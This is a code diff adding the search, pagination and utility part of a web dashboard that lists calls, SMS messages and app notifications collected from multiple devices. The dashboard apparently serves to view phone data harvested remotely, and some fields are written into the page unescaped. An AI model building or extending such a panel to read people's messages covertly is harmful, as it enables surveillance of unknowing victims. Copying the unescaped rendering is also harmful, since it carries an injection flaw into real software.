+    tbody.innerHTML = `<tr><td colspan="5"><div class="alert alert-error">Error: ${e.message}</div></td></tr>`;
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Search
+// ─────────────────────────────────────────────────────────────
+async function doSearch() {
+  const q = document.getElementById('search-input').value.trim();
+  const type = document.getElementById('search-type').value;
+  if (!q) return;
+
+  const el = document.getElementById('search-results');
+  el.innerHTML = '<div class="loading"><div class="spinner"></div>Searching...</div>';
+
+  try {
+    const qs = new URLSearchParams({ q, type });
+    if (deviceFilter) qs.set('device_id', deviceFilter);
+    const r = await api(`/api/search?${qs}`);
+    const d = r.data;
+    let html = '';
+
+    if (d.calls?.length) {
+      html += `<div class="section"><div class="section-title">📞 Calls (${d.calls.length})</div>
+        <div class="table-wrap"><table><thead><tr><th>Device</th><th>Title</th><th>Body</th><th>Time</th></tr></thead><tbody>
+        ${d.calls.map(e=>`<tr><td class="mono" style="font-size:11px">${e.device_name||e.device_id}</td><td>${esc(e.title)}</td><td class="ellipsis">${esc(e.body)}</td><td class="mono">${fmt(e.timestamp)}</td></tr>`).join('')}
+        </tbody></table></div></div>`;
+    }
+    if (d.sms?.length) {
+      html += `<div class="section"><div class="section-title">💬 SMS (${d.sms.length})</div>
+        <div class="table-wrap"><table><thead><tr><th>Device</th><th>From</th><th>Message</th><th>Time</th></tr></thead><tbody>
+        ${d.sms.map(e=>`<tr><td class="mono" style="font-size:11px">${e.device_name||e.device_id}</td><td>${esc(e.title)}</td><td class="ellipsis">${esc(e.body)}</td><td class="mono">${fmt(e.timestamp)}</td></tr>`).join('')}
+        </tbody></table></div></div>`;
+    }
+    if (d.notifications?.length) {
+      html += `<div class="section"><div class="section-title">🔔 Notifications (${d.notifications.length})</div>
+        <div class="table-wrap"><table><thead><tr><th>Device</th><th>App</th><th>Title</th><th>Content</th><th>Time</th></tr></thead><tbody>
+        ${d.notifications.map(e=>`<tr><td class="mono" style="font-size:11px">${e.device_name||e.device_id}</td><td class="mono">${e.package_name}</td><td>${esc(e.title)}</td><td class="ellipsis">${esc(e.content)}</td><td class="mono">${fmt(e.timestamp)}</td></tr>`).join('')}
+        </tbody></table></div></div>`;
+    }
+
+    if (!html) html = '<div class="empty"><div class="empty-icon">🔍</div>No results found</div>';
+    el.innerHTML = html;
+  } catch (e) {
+    el.innerHTML = `<div class="alert alert-error">Search failed: ${e.message}</div>`;
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Pagination
+// ─────────────────────────────────────────────────────────────
+function renderPagination(containerId, page, total, limit, onChange) {
+  const pages = Math.ceil(total / limit);
+  const el = document.getElementById(containerId);
+  if (pages <= 1) { el.innerHTML = ''; return; }
+  el.innerHTML = `
+    <button class="pg-btn" onclick="(${onChange.toString()})(${page-1})" ${page<=1?'disabled':''}>← Prev</button>
+    <span class="pg-info">Page ${page} / ${pages} &nbsp;(${total} total)</span>
+    <button class="pg-btn" onclick="(${onChange.toString()})(${page+1})" ${page>=pages?'disabled':''}>Next →</button>`;
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Utils
+// ─────────────────────────────────────────────────────────────
+function setText(id, val) {
+  const el = document.getElementById(id);
+  if (el) el.textContent = val ?? '—';
+}
+function setBadge(id, val) {
+  const el = document.getElementById(id);
+  if (el) el.textContent = val ?? 0;
+}
+function esc(s) {
+  return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+function fmt(ts) {
+  if (!ts) return '—';
+  const d = new Date(ts);
+  return d.toLocaleDateString('en-IN',{day:'2-digit',month:'short'}) + ' ' +
+         d.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit',hour12:true});
+}
+function timeAgo(ts) {
+  const diff = Date.now() - new Date(ts).getTime();
+  const m = Math.floor(diff/60000);
+  if (m < 1) return 'just now';
+  if (m < 60) return `${m}m ago`;
+  const h = Math.floor(m/60);
+  if (h < 24) return `${h}h ago`;
+  return `${Math.floor(h/24)}d ago`;
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Auto-connect on load
+// ─────────────────────────────────────────────────────────────
+window.addEventListener('load', () => {
+  connectServer();
+});
+</script>
+</body>
+</html>
